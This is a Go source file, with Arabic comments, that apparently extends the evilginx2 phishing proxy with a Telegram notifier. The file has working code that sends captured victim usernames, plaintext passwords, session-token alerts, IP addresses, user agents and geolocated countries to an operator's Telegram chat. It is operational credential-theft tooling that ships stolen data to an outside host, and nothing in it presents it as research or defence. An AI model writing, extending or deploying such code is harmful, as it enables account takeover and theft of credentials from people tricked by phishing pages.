package core

import (
	"fmt"
	"net/http"
	"net/url"
	"io/ioutil"
	"strings"
	"encoding/json"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

type TelegramBot struct {
	Token     string
	ChatID    string
	Enabled   bool
	Client    *http.Client
}

// NewTelegramBot ينشئ كائن جديد من بوت تليجرام
func NewTelegramBot(token string, chatID string) *TelegramBot {
	enabled := token != "" && chatID != ""
	if enabled {
		tokenPreview := ""
		if len(token) > 8 {
			tokenPreview = token[:8] + "****"
		} else {
			tokenPreview = "****"
		}
		log.Info("تم تفعيل بوت تليجرام - التوكن: %s - معرف المحادثة: %s", tokenPreview, chatID)
	}
	
	return &TelegramBot{
		Token:    token,
		ChatID:   chatID,
		Enabled:  enabled,
		Client:   &http.Client{},
	}
}

// GetCountryFromIP يجلب معلومات البلد من عنوان IP باستخدام خدمة ipinfo.io
func (t *TelegramBot) GetCountryFromIP(ipAddress string) string {
	if ipAddress == "127.0.0.1" || strings.HasPrefix(ipAddress, "192.168.") || strings.HasPrefix(ipAddress, "10.") {
		return "Local"
	}

	url := "https://ipinfo.io/" + ipAddress + "/json"
	resp, err := http.Get(url)
	if err != nil {
		log.Warning("فشل في الحصول على معلومات البلد: %v", err)
		return "Unknown"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Warning("فشل في قراءة استجابة ipinfo: %v", err)
		return "Unknown"
	}

	var result map[string]interface{}
	err = json.Unmarshal(body, &result)
	if err != nil {
		log.Warning("فشل في تحليل استجابة ipinfo: %v", err)
		return "Unknown"
	}

	if country, ok := result["country"].(string); ok {
		return country
	}

	return "Unknown"
}

// SendMessage يرسل رسالة إلى التشات المحدد
func (t *TelegramBot) SendMessage(message string) error {
	if !t.Enabled {
		return nil
	}

	apiUrl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.Token)
	data := url.Values{}
	data.Set("chat_id", t.ChatID)
	data.Set("text", message)
	data.Set("parse_mode", "HTML")

	// محاولة إرسال الرسالة ثلاث مرات في حالة الفشل
	var lastErr error
	for i := 0; i < 3; i++ {
		if i > 0 {
			log.Warning("محاولة إعادة إرسال الرسالة... محاولة %d من 3", i+1)
			// إضافة تأخير قبل إعادة المحاولة
			time.Sleep(time.Duration(2*i) * time.Second)
		}

		req, err := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode()))
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في إنشاء طلب: %v", err)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		// إضافة timeout للطلب
		client := &http.Client{
			Timeout: 10 * time.Second,
		}

		resp, err := client.Do(req)
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في إرسال الرسالة: %v", err)
			continue
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في قراءة الاستجابة: %v", err)
			continue
		}

		var result map[string]interface{}
		err = json.Unmarshal(body, &result)
		if err != nil {
			lastErr = err
			log.Error("telegram: فشل في تحليل استجابة تليجرام: %v", err)
			continue
		}

		ok, exists := result["ok"].(bool)
		if !exists || !ok {
			lastErr = fmt.Errorf("استجابة خاطئة من تليجرام: %s", string(body))
			log.Error("telegram: %v", lastErr)
			continue
		}

		log.Debug("telegram: تم إرسال الرسالة بنجاح")
		return nil // نجاح
	}

	return lastErr // إرجاع آخر خطأ حصل
}

// NotifyNewVisit يرسل إشعارًا بزيارة جديدة
func (t *TelegramBot) NotifyNewVisit(sessionID string, phishlet string, ipAddress string, userAgent string) error {
	if !t.Enabled {
		return nil
	}

	country := t.GetCountryFromIP(ipAddress)

	message := fmt.Sprintf(
		"🔔 <b>New Visit</b>\n\n"+
		"🌐 <b>Phishlet:</b> %s\n"+
		"🆔 <b>Session ID:</b> %s\n"+
		"🌍 <b>Country:</b> %s\n"+
		"🖥 <b>IP Address:</b> %s\n"+
		"📱 <b>User Agent:</b> %s",
		phishlet, sessionID, country, ipAddress, userAgent,
	)

	return t.SendMessage(message)
}

// NotifyCredentialsCaptured يرسل إشعارًا عند التقاط بيانات الاعتماد
func (t *TelegramBot) NotifyCredentialsCaptured(sessionID string, phishlet string, username string, password string, ipAddress string) error {
	if !t.Enabled {
		return nil
	}

	country := t.GetCountryFromIP(ipAddress)

	message := fmt.Sprintf(
		"🎣 <b>Credentials Captured</b>\n\n"+
		"🌐 <b>Phishlet:</b> %s\n"+
		"🆔 <b>Session ID:</b> %s\n"+
		"👤 <b>Username:</b> %s\n"+
		"🔑 <b>Password:</b> %s\n"+
		"🌍 <b>Country:</b> %s\n"+
		"🖥 <b>IP Address:</b> %s",
		phishlet, sessionID, username, password, country, ipAddress,
	)

	return t.SendMessage(message)
}

// NotifyTokensCaptured يرسل إشعارًا عند التقاط الرموز
func (t *TelegramBot) NotifyTokensCaptured(sessionID string, phishlet string, ipAddress string) error {
	if !t.Enabled {
		return nil
	}

	country := t.GetCountryFromIP(ipAddress)

	message := fmt.Sprintf(
		"🔐 <b>Tokens Captured</b>\n\n"+
		"🌐 <b>Phishlet:</b> %s\n"+
		"🆔 <b>Session ID:</b> %s\n"+
		"🌍 <b>Country:</b> %s\n"+
		"🖥 <b>IP Address:</b> %s",
		phishlet, sessionID, country, ipAddress,
	)

	return t.SendMessage(message)
} 